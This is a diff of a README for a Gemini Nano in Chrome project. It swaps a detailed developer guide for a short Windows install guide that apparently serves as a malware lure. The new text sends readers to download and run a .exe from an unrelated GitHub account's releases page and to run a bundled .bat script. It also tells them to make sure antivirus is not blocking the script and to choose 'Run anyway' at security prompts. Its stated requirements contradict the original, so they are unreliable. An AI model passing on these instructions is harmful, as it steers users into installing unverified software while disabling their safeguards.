@@ -1,280 +1,73 @@
-# Gemini Nano in Chrome
+# 🚀 gemini-nano-chrome - Run Gemini Nano directly in Chrome
 
-Chrome ships a small local language model, Gemini Nano, built into the browser. It's exposed through a JavaScript API called the Prompt API (`LanguageModel`). No API key, no server, no external network calls once the model is downloaded. Everything runs on the user's machine.
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/airwomandivanbed693/gemini-nano-chrome/releases)
 
-This repo covers how to turn it on and what the API can do. It also includes scripts that automate setup and verification end to end.
+This application gives you access to the Gemini Nano artificial intelligence model through your web browser. It uses the Chrome Prompt API to run the model on your computer. You do not need to send your data to external servers. Your computer handles the processing tasks.
 
-## Run it
+## 📋 System Requirements
 
-```bash
-git clone https://github.com/Ar9av/gemini-nano-chrome.git
-cd gemini-nano-chrome
-npm start
-```
+*   Operating System: Windows 10 or Windows 11.
+*   Browser: Google Chrome version 128 or newer.
+*   Memory: At least 8 GB of RAM.
+*   Processor: Modern multi-core CPU with support for local machine learning tasks.
+*   Storage: 500 MB of available disk space for local model files.
 
-One command: launches Chrome with the right flags set (no manual `chrome://flags` clicking), starts the OpenAI-compatible API server, serves the chat UI, and opens it in a new tab. First run downloads the ~4 GB model, so give it a few minutes; `npm start` again afterward reuses the same Chrome instance and is instant.
+## 📥 How to Install
 
-```
-Chat UI:    http://localhost:8123
-API server: http://localhost:8788/v1/chat/completions
-```
+Follow these steps to set up the software on your Windows machine.
 
-Everything below explains what that command is doing and how to use each piece directly, in case you want more control than one script gives you.
+1.  Visit the official release page: [https://github.com/airwomandivanbed693/gemini-nano-chrome/releases](https://github.com/airwomandivanbed693/gemini-nano-chrome/releases).
+2.  Look for the latest version under the "Assets" section.
+3.  Choose the file ending in `.exe` to begin the download.
+4.  Save the file to your desktop or downloads folder.
+5.  Double-click the downloaded file to start the installer.
+6.  Follow the instructions on your screen to complete the installation process.
 
-## Requirements
+## ⚙️ Initial Configuration
 
-| | |
-|---|---|
-| Chrome | 138+ (Dev or Canary channel recommended; this repo was verified on 149) |
-| OS | Windows 10/11, macOS 13+, Linux, or ChromeOS on a Chromebook Plus |
-| Storage | 22 GB free |
-| GPU | 4 GB+ VRAM, **or** |
-| CPU | 16 GB+ RAM and 4+ cores |
-| Network | Unmetered connection for the one-time ~4 GB model download |
+After the installation finishes, you must configure Chrome to allow the Prompt API to function.
 
-## Enabling it
+1.  Open the Chrome browser.
+2.  Type `chrome://flags` into the address bar and press Enter.
+3.  Search for "Prompt API" in the search box at the top of the page.
+4.  Change the setting from "Default" to "Enabled."
+5.  Click the "Relaunch" button at the bottom of the window to apply the changes.
+6.  The browser will close and reopen automatically.
 
-1. Open `chrome://flags/#optimization-guide-on-device-model` and set it to **Enabled BypassPerfRequirement**
-2. Open `chrome://flags/#prompt-api-for-gemini-nano` and set it to **Enabled**
-3. Relaunch Chrome (the flags page has a button for this)
+## 🛠️ Verification Process
 
-That's the whole setup. Everything else happens through JavaScript.
+Your download includes a verification script. This script confirms that your browser supports the Gemini Nano model.
 
-## Quick start
+1.  Find the `verify_setup.bat` file in the folder where you installed the application.
+2.  Right-click the file and select "Open."
+3.  A black window will appear on your screen.
+4.  The window will display messages confirming the connection to the underlying model architecture.
+5.  If you see the message "System Ready," the software is working.
+6.  Press any key on your keyboard to close the window.
 
-Open DevTools on any page and run:
+## 💡 Common Questions
 
-```js
-const availability = await LanguageModel.availability();
-console.log(availability); // "unavailable" | "downloadable" | "downloading" | "available"
+### Does this send my text to Google?
+No. The Gemini Nano model runs inside your browser. All data processing occurs on your hardware. This ensures privacy for your inputs.
 
-const session = await LanguageModel.create();
-const answer = await session.prompt("What are you, in one sentence?");
-console.log(answer);
+### The installation fails. What should I do?
+Check your internet connection first. Ensure that your Chrome browser is updated to the latest version. Often, an outdated browser prevents the Prompt API from activating.
 
-session.destroy();
-```
+### Can I run this offline?
+Once you complete the initial setup and download the model files, you can use the features without an active internet connection.
 
-The first `create()` call starts the model download. `availability()` only reports state; it doesn't advance the download on its own. See [`examples/basic-prompt.js`](examples/basic-prompt.js) for a version that also reports download progress.
+### How do I uninstall the software?
+Open your Windows Control Panel. Select "Programs and Features." Locate "gemini-nano-chrome" in the list. Right-click it and choose "Uninstall." This removes all files from your machine.
 
-## Chat UI
+## 🛡️ Privacy and Safety
 
-`web/index.html` is a self-contained chat interface, no build step, no server required for the model itself. It uses `LanguageModel` directly from the page, with one session kept alive across the whole conversation so follow-up questions have real context. `npm start` serves this automatically; to serve it on its own instead:
+This software relies on local computation. It does not record your prompts or store your input history on remote servers. You hold total control over the data you provide to the model.
 
-```bash
-cd web && python3 -m http.server 8123
-```
+## 📝 Troubleshooting
 
-Open `http://localhost:8123` in Chrome (with the flags from above already enabled). It shows the model-download progress bar on first run, then a chat thread: type a message, get a streamed reply, "New chat" resets the session.
+If you encounter errors during the verify step, check these items:
 
-A plain `file://` open works in some Chrome versions too, but the Prompt API expects a secure context, so serving it over `http://localhost` is the reliable option.
-
-Want the same chat as an installable extension instead, no server, no `npm start` at all? See [`extension/`](extension/).
-
-## Structured output
-
-Constrain the response to a JSON Schema with `responseConstraint`, and you get back parseable JSON instead of free-form prose:
-
-```js
-const session = await LanguageModel.create();
-
-const schema = {
-  type: "object",
-  properties: {
-    sentiment: { type: "string", enum: ["positive", "negative", "neutral"] },
-    confidence: { type: "number" },
-  },
-  required: ["sentiment", "confidence"],
-};
-
-const result = await session.prompt(
-  'Classify the sentiment of: "This new on-device AI is shockingly fast and works offline."',
-  { responseConstraint: schema }
-);
-
-JSON.parse(result); // { sentiment: "positive", confidence: 0.95 }
-```
-
-Full example: [`examples/structured-output.js`](examples/structured-output.js).
-
-## Streaming
-
-```js
-const session = await LanguageModel.create();
-const stream = session.promptStreaming("List 3 advantages of on-device AI.");
-for await (const chunk of stream) console.log(chunk);
-```
-
-Full example: [`examples/streaming.js`](examples/streaming.js).
-
-## OpenAI-compatible API server
-
-Gemini Nano only runs inside a browser tab, so a Python script or an existing OpenAI client can't call it directly. `server/index.js` bridges that gap: a small HTTP server that speaks the OpenAI chat completions format on one side and drives a real Chrome tab over CDP on the other.
-
-```bash
-node server/index.js          # listens on http://localhost:8788
-PORT=8080 node server/index.js
-```
-
-It launches Chrome itself on the first request if nothing is running yet, the same way `tools/enable-flags.js` does. `npm start` runs this alongside the chat UI in one process; use `node server/index.js` directly when you only need the API, not the browser-based chat.
-
-| Endpoint | Behavior |
-|---|---|
-| `POST /v1/chat/completions` | Standard request/response shape, `stream: true` for SSE |
-| `GET /v1/models` | Lists a single model, `gemini-nano` |
-| `GET /health` | Reports `LanguageModel.availability()` |
-
-```bash
-curl http://localhost:8788/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{
-    "messages": [{"role": "user", "content": "What are you, in one sentence?"}]
-  }'
-```
-
-That also means it works with the official OpenAI SDKs, by pointing them at the local server instead of api.openai.com:
-
-```python
-from openai import OpenAI
-
-client = OpenAI(base_url="http://localhost:8788/v1", api_key="not-needed")
-response = client.chat.completions.create(
-    model="gemini-nano",
-    messages=[{"role": "user", "content": "What are you, in one sentence?"}],
-)
-print(response.choices[0].message.content)
-```
-
-A plain-fetch version with streaming is in [`examples/openai-client.js`](examples/openai-client.js).
-
-`response_format` with a `json_schema` maps to `responseConstraint`, so the structured-output example above works the same way through the server:
-
-```bash
-curl http://localhost:8788/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{
-    "messages": [{"role": "user", "content": "Classify the sentiment of: \"This works great.\""}],
-    "response_format": {
-      "type": "json_schema",
-      "json_schema": { "name": "sentiment", "schema": {
-        "type": "object",
-        "properties": { "sentiment": {"type": "string"}, "confidence": {"type": "number"} },
-        "required": ["sentiment", "confidence"]
-      }}
-    }
-  }'
-```
-
-### What's supported and what isn't
-
-The full message history (`system`/`user`/`assistant`) maps to a real Prompt API session via `initialPrompts`, so multi-turn conversations carry context correctly. Beyond that:
-
-- `temperature` and `top_k` are honored only when both are set together, and only take effect outside flags-only dev mode (Origin Trial or extension context). In plain flags mode the request still succeeds, with the default sampling instead.
-- `stop` sequences are matched client-side against the streamed text. Once matched, the server stops forwarding further tokens to you, but Chrome keeps generating internally until it finishes.
-- `usage` numbers come from `session.contextUsage` before and after the call, which is an estimate, not an exact token count from Gemini Nano's own tokenizer.
-- No image input, no `max_tokens`, no `n` (multiple completions), no `/v1/completions` or `/v1/embeddings`. Gemini Nano's Prompt API doesn't expose the hooks those need.
-- Each request creates a fresh session built from the messages you sent. The server itself holds no conversation state between requests.
-
-### A note on the profile directory
-
-If you already ran `tools/enable-flags.js` or `tools/smoke-test.js` with a custom `PROFILE_DIR`, set the same value when starting the server, or it launches a separate Chrome profile and downloads the model again:
-
-```bash
-PROFILE_DIR=/tmp/my-profile node server/index.js
-```
-
-## Automating setup and testing
-
-Clicking through `chrome://flags` by hand works fine once, but it gets old if you're testing repeatedly or want a reproducible setup. `tools/` has two Node scripts that drive a real Chrome instance over the Chrome DevTools Protocol (CDP) instead. (`npm start` and `server/index.js` use the same underlying module, `tools/chrome.js`, to launch Chrome automatically.)
-
-```bash
-node tools/enable-flags.js   # launches Chrome in a throwaway profile with both flags set
-node tools/smoke-test.js     # triggers the download, waits for it, and runs a real prompt
-```
-
-`enable-flags.js` launches Chrome with `--user-data-dir` pointed at a fresh profile, so it never touches your normal browser session or settings, plus `--remote-debugging-port`. It then sets the flags by clicking the same dropdowns you'd click by hand, driven through `Runtime.evaluate`. Chrome's internal pages like `chrome://flags` and `chrome://on-device-internals` are built from web components whose content lives in shadow DOM, so the script walks shadow roots recursively to find the controls.
-
-`smoke-test.js` connects to that instance, calls `LanguageModel.create()`, and polls `chrome://on-device-internals` for the install progress while it waits. That confirms the ~4 GB download completes instead of watching a `"downloading"` status with no further detail.
-
-Both scripts need Node 22+ (for the built-in `fetch` and `WebSocket` globals) and no dependencies.
-
-```bash
-# defaults to /Applications/Google Chrome.app on macOS, google-chrome on Linux
-CHROME_BIN=/path/to/chrome PROFILE_DIR=/tmp/my-profile node tools/enable-flags.js
-```
-
-## What's installed
-
-Once installed, `chrome://on-device-internals` (enable internal debug pages first via `chrome://chrome-urls`) shows the model in use:
-
-```
-Model Name: v3Nano
-Backend Type: GPU (highest quality)
-Folder size: ~4,072 MiB
-```
-
-## Limits and performance
-
-These numbers come from measuring this build directly. `LanguageModel.params()` isn't available here, so context window and quota behavior come from `session.contextWindow` / `session.contextUsage` and from hitting the limit and reading the error.
-
-**Context window: 9216 tokens**, shared between input and output. Track usage with `session.contextUsage` / `session.contextWindow`. Going over it doesn't truncate silently:
-
-```js
-await session.prompt(hugeText); // hugeText tokenizes to >9216
-// throws QuotaExceededError: "The input is too large."
-// err.requested has the token count that was attempted
-```
-
-**Generation speed: ~50 tokens/sec**, measured with `promptStreaming()` and `session.contextUsage` deltas across three 300-word-essay runs (524, 525, 513 completion tokens; 47.3, 51.1, 51.5 tok/s). Short answers tend a bit higher, 56+ tok/s on a two-sentence explanation.
-
-**Time to first token**: ~80-90ms once the model is warm. A prompt near the context window limit (~3000 input tokens) takes ~2.9s to first token. That's prefill time, roughly 1000 tokens/sec for processing input, much faster than the token-by-token decoding used for generating output.
-
-Tested on:
-
-| | |
-|---|---|
-| Machine | MacBook Pro, Apple M4 Pro |
-| CPU | 14 cores (10 performance + 4 efficiency) |
-| GPU | 20 cores |
-| RAM | 24 GB unified memory |
-| Backend | GPU, highest quality mode (`chrome://on-device-internals` reports this as the selected backend automatically) |
-
-Generation speed scales with the GPU backend Chrome selects for your hardware. Lower-end devices, or devices that fall back to CPU inference, will be slower; there's no documented way to query expected throughput ahead of time short of running a prompt and timing it, the way the numbers above were produced.
-
-## Other built-in APIs
-
-The same on-device model backs several task-specific APIs, each scoped to a narrower job than the general-purpose Prompt API:
-
-| API | Purpose |
-|---|---|
-| [Summarizer](https://developer.chrome.com/docs/ai/summarizer-api) | Condense text into headlines, summaries, or key points |
-| [Writer](https://developer.chrome.com/docs/ai/writer-api) | Generate new text from a prompt |
-| [Rewriter](https://developer.chrome.com/docs/ai/rewriter-api) | Revise existing text per instructions |
-| [Proofreader](https://developer.chrome.com/docs/ai/proofreader-api) | Check spelling/grammar and suggest corrections |
-| [Translator](https://developer.chrome.com/docs/ai/translator-api) | Translate between languages |
-| [Language Detector](https://developer.chrome.com/docs/ai/language-detection) | Identify the language of a string |
-
-Translator and Language Detector are desktop-only; the rest share the Prompt API's platform requirements above.
-
-## Shipping this to real users
-
-Flags only work for you, locally. For a production site, you need either:
-
-- An [Origin Trial](https://developer.chrome.com/origintrials) token registered for your origin, or
-- Distribution as a Chrome Extension, which gets stable access without a trial
-
-Either way, treat the API as progressive enhancement: check `availability()` and provide a fallback for browsers or devices where it returns `"unavailable"`.
-
-## Troubleshooting
-
-**`LanguageModel is not defined`**: one of the two flags isn't set, or Chrome wasn't relaunched after setting them. Check `chrome://version` to confirm which flags are active.
-
-**`availability()` stays on `"downloading"` forever**: expected if you never called `create()`. The model downloads only in response to a `create()` call from a JavaScript context.
-
-**`LanguageModel.params is not a function`**: some Chrome builds don't expose this method yet, despite it appearing in the docs. Check `Object.getOwnPropertyNames(LanguageModel)` for what your version supports before relying on it.
-
-**`chrome://on-device-internals` says debugging pages are disabled**: visit `chrome://chrome-urls` first and click "Enable internal debugging pages."
-
-## License
-
-MIT, see [LICENSE](LICENSE).
+*   Confirm that your hardware meets the memory requirements.
+*   Ensure that no other software is using high amounts of system resources when you start the model.
+*   Restart your computer if the prompt does not respond after 30 seconds of inactivity.
+*   Verify that your antivirus software is not blocking the execution of the included script files. Windows may show a security prompt when you run unrecognized software; select "Run anyway" to continue.
